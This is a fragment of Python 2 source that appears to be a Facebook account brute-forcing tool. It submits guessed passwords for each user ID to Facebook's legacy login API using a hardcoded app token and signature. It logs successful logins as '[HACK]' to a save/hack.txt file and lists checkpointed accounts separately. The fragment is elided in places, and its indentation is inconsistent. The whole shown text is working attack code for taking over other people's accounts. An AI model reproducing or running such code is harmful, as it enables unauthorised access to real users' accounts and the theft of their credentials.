						...
						# https://fb.me/Tendo.Pain8
								...
								if 'access_token' in q:
									...
									if 'access_token' in q:
										...
										print '[CHECK] '+ user +' | '+ p7
										cekpoint.append(user+p7)

									else:
                                                                                p8 = 'indonesia'
                                                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + p8 + '&sdk=ios&generate_session_cookies=1&sig=1QDNWjJdBnNp8JNuQFhRWeQXL3fDb84cVS')
                                                                                q = json.load(data)
                                                                                if 'access_token' in q:
                                                                                        print '[HACK] '+ user +' | '+ p8
											cek = open('save/hack.txt','a')
											...
											print '[CHECK] '+ user +' | '+ p8
                                                                                        cekpoint.append(user+p8)

										else:
                                                                                        p9 = 'kontol'
                                                                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + p9 + '&sdk=ios&generate_session_cookies=1&sig=1QDNWjJdBnNp8JNuQFhRWeQXL3fDb84cVS')
                                                                                        q = json.load(data)
                                                                                        if 'access_token' in q:
                                                                                                print '[HACK] '+ user +' | '+ p9
											        cek = open('save/hack.txt','a')
